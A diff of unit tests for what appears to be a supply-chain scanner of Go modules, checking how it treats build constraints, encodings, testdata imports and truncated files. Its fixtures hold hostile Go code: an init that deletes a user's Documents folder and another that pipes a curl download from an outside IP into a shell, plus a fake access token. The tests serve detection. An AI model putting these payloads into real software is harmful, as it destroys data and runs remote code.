@@ -125,6 +125,8 @@ import "C"
 func F() int { return 1 }
 '''
 CLEAN_GO = "package m\n\nimport \"strings\"\n\nfunc Upper(s string) string { return strings.ToUpper(s) }\n"
+# Go: init deletes a folder of the user's (F-06's review shape)
+DELETE_GO = 'package m\n\nimport "os"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n'
 
 # Rust: a build script, a procedural macro, a #[ctor] and a library function that pipe a download into a shell
 BUILD_RS = '''use std::process::Command;
@@ -200,6 +202,34 @@ class GoTests(unittest.TestCase):
                 res = go({name: INIT_GO.replace("package m", "package t"), "m.go": CLEAN_GO})
                 self.assertEqual((res["verdict"], found(res)), ("OK", []))
 
+    def test_a_file_is_left_out_only_for_a_constraint_go_reads_as_ignore(self):
+        """F-06: Go needs white space after `//go:build` and `+build`, so `//go:buildignore` and `// +buildignore`
+        are comments and the file builds; only a constraint Go reads as `ignore` and'd with other tags, where it
+        counts, leaves a file out (goread's build_ignored)."""
+        after_package = DELETE_GO.replace("package m\n", "package m\n\n//go:build ignore\n", 1)
+        for header in ("//go:buildignore\n\n", "//go:buildignore\n", "// +buildignore\n\n", "// +buildignore\n",
+                       "//go:build(ignore)\n\n", "/* //go:build ignore */\n\n", "/*\n//go:build ignore\n*/\n\n",
+                       "// +build ignore\n", "//go:build ignore\n//go:build ignore\n\n",
+                       "//go:build ignore || linux\n\n", "//go:build !ignore\n\n", None):
+            with self.subTest(header=header):
+                res = go({"m.go": CLEAN_GO, "d.go": after_package if header is None else header + DELETE_GO})
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
+                self.assertEqual([(r, s, f) for r, s, f, _l in found(res)],
+                                 [("SC-IMPORT-RISK", "CRITICAL", "m@v1.0.0/d.go")])
+        for header in ("//go:build ignore\n\n", "//go:build ignore\n", "//go:build ignore && linux\n\n",
+                       "//go:build (ignore)\n\n", "//go:build\tignore\n\n", "// +build ignore\n\n"):
+            with self.subTest(header=header):
+                res = go({"m.go": CLEAN_GO, "d.go": header + DELETE_GO})
+                self.assertEqual((res["verdict"], found(res)), ("OK", []))
+
+    def test_a_test_file_s_name_ends_in_test_go_exactly(self):
+        """Go's test files end in `_test.go` exactly: `m_TEST.go` and `m_Test.go` are built, so they are read."""
+        for name in ("m_TEST.go", "m_Test.go"):
+            with self.subTest(name=name):
+                res = go({name: INIT_GO, "m.go": CLEAN_GO})
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
+                self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", f"m@v1.0.0/{name}")])
+
     def test_a_clean_module_is_ok(self):
         res = go({"m.go": CLEAN_GO, "sub/s.go": "package sub\n\nfunc init() { println(\"ready\") }\n"})
         self.assertEqual((res["verdict"], res["verdictReason"], found(res)), ("OK", "no supply-chain indicators", []))
@@ -213,9 +243,190 @@ class GoTests(unittest.TestCase):
                                        "commands when someone runs it in the module's folders; a build never does.")
 
     def test_a_file_the_parser_refuses_is_still_read_by_the_file_rules(self):
+        # (F-06: and the module is INCOMPLETE: a build may compile what the engine's parser refuses)
         res = go({"m.go": CLEAN_GO, "bad.go": 'package m\n\nconst k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\nfunc (\n'})
-        self.assertEqual(res["verdict"], "OK")
+        self.assertEqual(res["verdict"], "INCOMPLETE")
         self.assertIn("S-TOKEN", {i["rule"] for i in res["issues"]})
+        (cut,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED"]
+        self.assertEqual(cut["file"], "m@v1.0.0/bad.go")
+        self.assertIn("the engine's Go parser refused m@v1.0.0/bad.go at line 5 (", cut["msg"])
+        self.assertIn("code", res["incomplete"])
+
+    def test_a_file_is_read_as_the_go_toolchain_reads_its_bytes(self):
+        """F-06's review: the reader decides on the bytes as Go reads them (go_text): a lone "\\r" is no line end to
+        Go, a second byte order mark is code to it, and a file Go refuses (a NUL its reader meets, a //go:build line
+        that does not parse) is never left out. The rules read the text as before (the third round): a UTF-16 file's
+        token is found, while the reader, as Go, refuses its NULs."""
+        body = DELETE_GO.encode()
+        for data in (b"// c\r//go:build ignore\n\n" + body, b"// c\r// +build ignore\n\n" + body,
+                     b"//+build ignore\r// +build x\n\n" + body, b"\xef\xbb\xbf\xef\xbb\xbf//go:build ignore\n\n" + body,
+                     b'package m\n\nimport "os"\n\nvar s = "a\rb"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n'):
+            with self.subTest(data=data[:40]):
+                res = go({"m.go": CLEAN_GO, "d.go": data})
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
+                self.assertEqual([(r, s, f) for r, s, f, _l in found(res)], [("SC-IMPORT-RISK", "CRITICAL", "m@v1.0.0/d.go")])
+        refused = [b"//go:build ignore\n\npackage m\n// \x00\n\n" + body[len(b"package m\n\n"):],
+                   b"//go:build ignore\r\rpackage m\r\r" + body[len(b"package m\n\n"):]]
+        for data in refused:
+            with self.subTest(data=data[:24]):
+                res = go({"m.go": CLEAN_GO, "d.go": data})
+                self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
+                self.assertEqual([(i["rule"], i["file"]) for i in res["issues"] if i["rule"] == "SC-TRUNCATED"],
+                                 [("SC-TRUNCATED", "m@v1.0.0/d.go")])
+        # UTF-16: the rules read the decoded text (its token, at its line); Go refuses the bytes (NULs, invalid
+        # UTF-8), and so does the reader, with no SC-TRUNCATED of its own (it is not text to Go): the init that
+        # never compiles is no SC-IMPORT-RISK (a token is listed, the verdict OK)
+        token = 'const k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\n'
+        for h in ("//go:build ignore\n\n", "// +build ignore\n\n", ""):
+            text = h + DELETE_GO + token
+            for data, codec in ((b"\xff\xfe" + text.encode("utf-16-le"), "utf-16-le"),
+                                (b"\xfe\xff" + text.encode("utf-16-be"), "utf-16-be"),
+                                (text.encode("utf-16-le"), "utf-16-le")):
+                with self.subTest(header=h, codec=codec, bom=data[:2]):
+                    res = go({"m.go": CLEAN_GO, "d.go": data})
+                    self.assertEqual(res["verdict"], "OK", res["issues"])
+                    self.assertEqual([(i["rule"], i["file"], i["line"]) for i in res["issues"] if i["rule"] == "S-TOKEN"],
+                                     [("S-TOKEN", "m@v1.0.0/d.go", text.count("\n"))])
+                    self.assertEqual([i for i in res["issues"] if i["rule"] in ("SC-TRUNCATED", "SC-IMPORT-RISK")], [])
+        # the quiet controls stay quiet: CRLF, one byte order mark
+        for data in (b"//go:build ignore\r\n\r\n" + body, b"\xef\xbb\xbf//go:build ignore\n\n" + body):
+            res = go({"m.go": CLEAN_GO, "d.go": data})
+            self.assertEqual((res["verdict"], found(res)), ("OK", []))
+
+    def test_a_testdata_package_the_module_imports_is_read(self):
+        """F-06's review: a package in testdata/ that the module's code imports is built (go list -deps, go mod
+        vendor), so the reader reads it, and the file rules too; one nothing imports stays unread."""
+        lib = 'package m\n\nimport _ "example.test/m/testdata/x"\n\nfunc F() int { return 1 }\n'
+        x = DELETE_GO.replace("package m", "package x") + f'\nvar blob = "{B64_DATA}"\n'
+        res = go({"lib.go": lib, "testdata/x/x.go": x})
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
+        self.assertEqual({(i["rule"], i["file"]) for i in res["issues"] if i["rule"].startswith("SC-")},
+                         {("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go"), ("SC-B64", "m@v1.0.0/testdata/x/x.go")})
+        res = go({"lib.go": CLEAN_GO, "testdata/x/x.go": x})
+        self.assertEqual((res["verdict"], found(res)), ("OK", []))
+
+    def test_testdata_packages_are_read_as_go_builds_them(self):
+        """F-06's third round: the reader is given a testdata/ package's files when an import names it (its answer's
+        `wanted`), so they are decoded and counted only then: a chain whose last link sorts first, a package below
+        another folder; one nothing imports is data, even past the reader's bound; a file the parser refused reads
+        none of them."""
+        lib = lambda imp: f'package m\n\nimport _ "{imp}"\n\nfunc F() int {{ return 1 }}\n'
+        x = DELETE_GO.replace("package m", "package x")
+        res = go({"lib.go": lib("example.test/m/testdata/z"), "testdata/a/a.go": x,
+                  "testdata/z/z.go": 'package z\n\nimport _ "example.test/m/testdata/a"\n'})
+        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/testdata/a/a.go")])
+        res = go({"lib.go": lib("example.test/m/sub/testdata/x"), "sub/testdata/x/x.go": x})
+        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/sub/testdata/x/x.go")])
+        # (not imported: never decoded, nor counted against the reader's bound)
+        big = {f"testdata/fx/f{k}.go": x + "// " + "x" * 200 + "\n" for k in range(4)}
+        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 400), \
+                mock.patch.object(repo.lazaret, "decode_go_member", wraps=repo.lazaret.decode_go_member) as decoded:
+            res = go(dict(big, **{"lib.go": CLEAN_GO}))
+            self.assertEqual((res["verdict"], found(res)), ("OK", []))
+            self.assertEqual([c.args[0] for c in decoded.call_args_list], ["m@v1.0.0/lib.go"])
+            res = go(dict(big, **{"lib.go": lib("example.test/m/testdata/fx")}))
+            self.assertEqual(res["verdict"], "SUSPICIOUS")             # (imported: read, f0.go's init found)
+            self.assertEqual(sorted(i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"),
+                             [f"m@v1.0.0/testdata/fx/f{k}.go" for k in (1, 2, 3)])   # (past the bytes kept)
+        # a refused file reads none (the module is INCOMPLETE for it), and a refused template in a `_` folder no
+        # import names holds nothing (the review's casc and uscore)
+        res = go({"lib.go": CLEAN_GO, "testdata/s/s.go": x, "tools/gen/bad.go": "package gen\n\nfunc F( {\n"})
+        self.assertEqual((res["verdict"], [r for r, _s, _f, _l in found(res)]), ("INCOMPLETE", ["SC-TRUNCATED"]))
+        res = go({"lib.go": CLEAN_GO, "testdata/fx/f.go": x, "_examples/tmpl/t.go": "package {{.Name}}\n\nfunc F() {}\n"})
+        self.assertEqual((res["verdict"], found(res)), ("OK", []))
+
+    def test_an_imported_testdata_package_is_read_as_the_module_s_other_code(self):
+        """F-06's third round: an imported testdata/ package's files are read as the module's others are: as Go reads
+        their bytes (a "\\r" in a string), with their decoding's findings, a file a constraint leaves out unread by
+        the rules too; and only the package asked for is decoded."""
+        lib = 'package m\n\nimport _ "example.test/m/testdata/x"\n\nfunc F() int { return 1 }\n'
+        x = DELETE_GO.replace("package m", "package x")
+        crx = x.replace("\nfunc init", '\nvar s = "a\rb"\n\nfunc init')
+        res = go({"lib.go": lib, "testdata/x/x.go": crx})
+        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go")])
+        blob = x + "var blob = `" + "\x01\x02\x03\x04" * 100 + "`\n"            # (not text to the rules, Go's to Go)
+        res = go({"lib.go": lib, "testdata/x/x.go": blob})
+        self.assertEqual(sorted((r, f) for r, _s, f, _l in found(res)),
+                         [("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go"), ("SC-TRUNCATED", "m@v1.0.0/testdata/x/x.go")])
+        ignored = '//go:build ignore\n\npackage x\n\nconst k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\n'
+        res = go({"lib.go": lib, "testdata/x/x.go": x, "testdata/x/gen.go": ignored})
+        self.assertEqual([(i["rule"], i["file"]) for i in res["issues"]], [("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go")])
+        with mock.patch.object(repo.lazaret, "decode_go_member", wraps=repo.lazaret.decode_go_member) as decoded:
+            res = go({"lib.go": lib, "testdata/x/x.go": x, "testdata/y/y.go": x.replace("package x", "package y")})
+        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go")])
+        self.assertEqual(sorted(c.args[0] for c in decoded.call_args_list), ["m@v1.0.0/lib.go", "m@v1.0.0/testdata/x/x.go"])
+
+    def test_an_imported_testdata_file_not_kept_is_incomplete(self):
+        """F-06: a testdata/ file over the member limit, or past the bytes kept, is not read: INCOMPLETE when an
+        import names its package, nothing when none does (the review's tdbig)."""
+        lib = 'package m\n\nimport _ "example.test/m/testdata/x"\n\nfunc F() int { return 1 }\n'
+        x = DELETE_GO.replace("package m", "package x") + "// " + "x" * 200 + "\n"
+        with mock.patch.object(repo, "MAX_MEMBER", 200):
+            res = go({"lib.go": lib, "testdata/x/x.go": x})
+            self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
+            self.assertEqual([i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"], ["m@v1.0.0/testdata/x/x.go"])
+            res = go({"lib.go": CLEAN_GO, "testdata/x/x.go": x})
+            self.assertEqual((res["verdict"], found(res)), ("OK", []))
+        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 200):
+            res = go({"lib.go": lib, "testdata/x/x.go": x})
+            self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
+            (cut,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED"]
+            self.assertEqual(cut["file"], "m@v1.0.0/testdata/x/x.go")
+            self.assertIn("is in a testdata/ package the module imports", cut["msg"])
+            res = go({"lib.go": CLEAN_GO, "testdata/x/x.go": x})
+            self.assertEqual((res["verdict"], found(res)), ("OK", []))
+
+    def test_an_import_of_another_modules_testdata_is_major(self):
+        """F-06's third round: example.test/tb imports example.test/ta's testdata/x, which ta's own scan leaves out
+        as data: SC-GO-TESTDATA-IMPORT, MAJOR, in the importing module, with the path (the review's ta and tb)."""
+        res = go({"tb.go": 'package m\n\nimport _ "example.test/ta/testdata/x"\n\nfunc G() int { return 2 }\n'})
+        self.assertEqual(res["verdict"], "WARN", res["issues"])
+        (issue,) = [i for i in res["issues"] if i["rule"].startswith("SC-")]
+        self.assertEqual((issue["rule"], issue["sev"], issue["file"], issue["line"]),
+                         ("SC-GO-TESTDATA-IMPORT", "MAJOR", "m@v1.0.0/tb.go", 3))
+        self.assertIn("m@v1.0.0/tb.go imports example.test/ta/testdata/x, a package in another module's testdata/ "
+                      "folder", issue["msg"])
+
+    def test_an_import_of_a_nested_module_s_testdata_is_major(self):
+        """F-06's fourth round (the review's nst): example.test/nst imports example.test/nst/inner/testdata/x, where
+        example.test/nst/inner is a module of its own, which the zip leaves out: the import names no testdata/ folder
+        the module has, so it is another module's, SC-GO-TESTDATA-IMPORT; and the nested module's own scan leaves its
+        unimported testdata/ out (the review's nstinner)."""
+        nst = 'package m\n\nimport _ "example.test/m/inner/testdata/x"\n'
+        for extra in ({}, {"testdata/y/y.go": DELETE_GO.replace("package m", "package y")}):
+            with self.subTest(extra=sorted(extra)):
+                res = go(dict({"nst.go": nst}, **extra))
+                self.assertEqual(res["verdict"], "WARN", res["issues"])
+                self.assertEqual([(r, s, f, l) for r, s, f, l in found(res)],
+                                 [("SC-GO-TESTDATA-IMPORT", "MAJOR", "m@v1.0.0/nst.go", 3)])
+        inner = gomod_zip({"go.mod": "module example.test/m/inner\n\ngo 1.21\n", "inner.go": "package inner\n",
+                           "testdata/x/x.go": DELETE_GO.replace("package m", "package x")}, root="example.test/m/inner@v1.0.0")
+        res = scan(inner, "zip", "gomod")
+        self.assertEqual((res["verdict"], found(res)), ("OK", []))
+
+    def test_a_refused_file_has_one_truncated_finding(self):
+        """F-06's third round: a .go file that does not decode to text is SC-TRUNCATED once (its decoding's), not
+        once more for the parser's refusal; a refused file that is text, once (the parser's)."""
+        junk = b"package m\n" + bytes(range(1, 9)) * 60 + b"\n"
+        res = go({"m.go": CLEAN_GO, "junk.go": junk})
+        self.assertEqual([i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"], ["m@v1.0.0/junk.go"])
+        self.assertEqual(res["truncated"], 1)
+
+    def test_a_lone_carriage_return_keeps_the_rules_line_numbers(self):
+        """F-06's third round: Go reads a lone "\\r" as white space, the rules as a line end; the reader's findings
+        are numbered as the rules number lines (the review's crline)."""
+        src = (b'package m\n\n// one\r// two\r// three\n\nimport (\n\t"os/exec"\n)\n\nconst k = "AKIA'
+               + b'Q7R2ZK9M4TXW8B3N"\n\nfunc init() {\n\texec.Command("/bin/sh", "-c", "curl -s https://203.0.113.7/a.sh | sh").Run()\n}\n')
+        res = go({"m.go": src})
+        lines = {i["rule"]: i["line"] for i in res["issues"] if i["rule"] in ("S-TOKEN", "SC-IMPORT-RISK")}
+        self.assertEqual(lines, {"S-TOKEN": 11, "SC-IMPORT-RISK": 14}, res["issues"])
+
+    def test_a_package_in_vendor_itself_is_read(self):
+        # `m/vendor` is importable and built (`m/vendor/x` must be imported as `x`: not read, test_code_no_build_...)
+        res = go({"a.go": 'package m\n\nimport _ "example.test/m/vendor"\n',
+                  "vendor/v.go": DELETE_GO.replace("package m", "package vendor")})
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
+        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/vendor/v.go")])
 
     def test_a_module_too_large_to_read_is_incomplete(self):
         with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 40):
